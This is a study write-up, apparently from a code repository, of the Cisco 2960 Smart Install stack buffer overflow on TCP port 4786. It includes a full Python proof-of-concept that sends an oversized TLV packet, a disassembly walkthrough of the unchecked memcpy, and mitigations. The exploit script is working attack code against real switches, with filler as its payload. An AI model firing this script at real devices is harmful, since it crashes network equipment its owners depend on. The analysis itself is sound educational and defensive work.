### INTRODUCTION
why is C2960 targeted by attackers/security researchers?
* affordable and wide spread model

what is the main characteristic of C2960 to be easy to exploit?
* there're features listed online but one important feature of Cisco IOS is its behavior in case an exception condition occurs if something goes wrong, Cisco IOS reboots a device

### REVISION
what is buffer?
* buffer is a small memory allocated specifically for input, used when a process or a program is executed

what is buffer overflow attack?
* when attacker enters arbitrary input to buffer, long enough to overrun the buffer's boundary and overwrite adjacent memory location
* stack based buffer overflow in short is also known as buffer overflow

why do buffer overflow take place?
* mostly due to bad programming written, use of unsafe c function and unsanitized input

what is watchdog?
* a timer which automatically reboot the system if it detects some programs are not working




### SETUP
`Host A         <-----------------> C2960 SI PoE 24 Switch (c2960-lanlitek9-mz.122-58.SE2.bin)`<br/>
`192.168.200.2      <----------------->  192.168.200.1`

### HOW TO CHECK IF SWITCH IS VULNERABLE
`SW>show vstack config`<br/>
`SW>show tcp brief all`




### PoC SCRIPT BREAKDOWN

    import socket 
    import struct 
    from optparse import OptionParser 

    # Parse the target options 
    parser = OptionParser() 
    parser.add_option("-t", "--target", dest="target", help="Smart Install Client", default="192.168.1.1")  
    parser.add_option("-p", "--port", dest="port", type="int", help="Port of Client", default=4786)  
    (options, args) = parser.parse_args() 

    def craft_tlv(t, v, t_fmt='!I', l_fmt='!I'): 
      return struct.pack(t_fmt, t) + struct.pack(l_fmt, len(v)) + v 

    def send_packet(sock, packet): 
      sock.send(packet)   

    def receive(sock):  
      return sock.recv() 

    if __name__ == "__main__": 

    print "[*] Connecting to Smart Install Client ", options.target, "port", options.port 

    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    con.connect((options.target, options.port)) 

    payload = 'BBBB' * 44  
    shellcode = 'D' * 2048 

    data = 'A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payload 

    tlv_1 = craft_tlv(0x00000001, data)  
    tlv_2 = shellcode 

    hdr =  '\x00\x00\x00\x01'                                   # msg_from
    hdr += '\x00\x00\x00\x01'                                   # version
    hdr += '\x00\x00\x00\x07'                                   # msg_hdr_type
    hdr += struct.pack('>I', len(data))                         # data_length

    pkt = hdr + tlv_1 + tlv_2 

    print "[*] Send a malicious packet"  
    send_packet(con, pkt)



what is the objective of the script?
* the <SMI IBC Server Process> process contains a Smart Install Client implementation code
* the Smart Install Client starts a server on the TCP(4786) port (opened by default) to interact with the Smart Install Director
* a specially crafted malicious message ibd_init_discovery_msg for the stack-based buffer overflow occurs
* acts as the integrated branch director (IBD) 
* due to the no authentication desgin in this feature, this can be crafted easily
 

what is struct.park(function)?
* it packs a list of values into a string representation of the specified type
* !'I' --> format string for network also means big-endian
* fmt ---> format string

what is tlv?
* encoding scheme used within the data communication protocol
* for data formatting. when we want to send data to receiver, we prepare a TLV package that contains Tag-Length-Value datas
  1. data type/tag
  2. data length/size
  3. data value/content of the data
  
* format string for big-endian ---> (>I) 
* 4+4+4+4=16bytes for hdr ----> header which consists of |msg-from|version|msg_hdr-type|data_length|
* 36+4+(4*44)=216bytes  ---> TLV Data Value
* a single packet consists of | header (16 bytes)| TLV_1 (224 bytes)|TLV (2048 bytes) |


### CRAFTED PACKET STRUCTURE FROM THE SCRIPT
![packet structure](https://user-images.githubusercontent.com/23307275/39845863-de67a538-542a-11e8-9c23-7d5b38e13e75.PNG)


### WIRESHARK PACKET SNIFFING
![wireshark1](https://user-images.githubusercontent.com/23307275/39845865-dec1d724-542a-11e8-9ece-42d45e9f5526.PNG)

<br/>

![wireshark2](https://user-images.githubusercontent.com/23307275/39845860-ddc64f62-542a-11e8-90f1-d5e0707524b8.PNG)


### FUNCTION OF EXPOLIT IS LOCATED
* smi_ibc_handle_ibd_init_discovery_msg, SUB_B258CC

![overview](https://user-images.githubusercontent.com/23307275/39845857-d822a452-542a-11e8-9c19-e39ffbe45655.PNG)
![sub_routine](https://user-images.githubusercontent.com/23307275/39845855-d7c60620-542a-11e8-8bf1-408e90fcfcf3.PNG)


  R3: ptr to the tlv_type <br/>
  R4: length of tlv <br/>
  R5: ptr to the 16 bytes header <br/>
  R6: ptr to the TLV data <br/>
 
  ![allr](https://user-images.githubusercontent.com/23307275/39849919-5343e194-5441-11e8-809d-e86cc2236fda.PNG)
  <br/>
  ![r5](https://user-images.githubusercontent.com/23307275/39849921-57100046-5441-11e8-84e5-4cd2514e0378.PNG)
  <br/>
  ![r6](https://user-images.githubusercontent.com/23307275/39845864-de93c1fe-542a-11e8-922d-35b208c18658.PNG)
  <br/>

### LOGIC AND THE EXACT PLACE OF EXPLOIT

Focus 1:
``if (tlv_type == 1) {``
  ``#read tlv_length information``
``}``

Focus 2:
`if (tlv_length != 0) {`
  `#size = tlv_length     <-----(LOOPHOLE) NO VALIDATION CHECK`
`}

Focus 3:
`if (size != 0) {`
 `do {`
   `memcpy (src, dest, size);`
   `size-=1;`
 `} while (size!=0)`
`}`

* size is saved as a parameter for later memcpy (src, dest, size)
* tlv-type number assignment, http://irl.cs.ucla.edu/~cawka/spec/types.html
* size is the number of bytes to be copied
* fetch and copy data without verification
* just copy without checking if the size of the data exceed the allocated size of buffer <---- buffer overflow will occur

### BEFORE AND AFTER BUFFER OVERFLOW IN ASSEMBLY LANGUAGE CODE
![from the code logic](https://user-images.githubusercontent.com/23307275/39845862-de324c8a-542a-11e8-9df2-02a10f7cfb7d.PNG)

  R3 is the buffer length of 0x58 #dst <br/>
  R4 is the content of the TlL data #scr <br/>
  R5 is the tlv length #size <br/>

  memcpy (src, dest, size)

* 0xd8 (216 bytes) to be copied to the allocated 0x58 (88 bytes) buffer  <--- buffer overflow occurs
* R4 (data content) to R3 (buffer) do while the size is not 0 (referenced back to focus 3)

![before overflow](https://user-images.githubusercontent.com/23307275/39845861-de072bfe-542a-11e8-8e33-585ee1d6aace.PNG)

* the figure above shows that the contents of 0xd8 bytes starting from 0x318e890 will be copied into the buffers starting from 0x3df24a8 in the stack frame.

![after](https://user-images.githubusercontent.com/23307275/39850049-fb82c5dc-5441-11e8-918c-16ed55ac8c87.PNG)
 <br/>
 
* the above figure shows the contents of the function stack frame after the memcpy operation. The stack frame of this function is 0x58 bytes in size. After the function is overwritten by 0x42424242, the pointer of the execution code area is skipped resulting a buffer overflow situation. 

* the content of the register changes along with the CPU instructions
* register is a small set of data holding places that are part of the computer processor
* stack based buffer flow in this case
* conclude (summarize) the result of crash

### MIGITATIONS
1. no vstack command to disable the smart installed function (cannot be persistent, require reconfigure after reboot)
2. use ACL to filter traffic from tcp port 4786, or limit through Control Panel Policy (CoPP)
3. patch and upgrade
4. use new plug and play (Cisco Network Plug and Play) solution instead
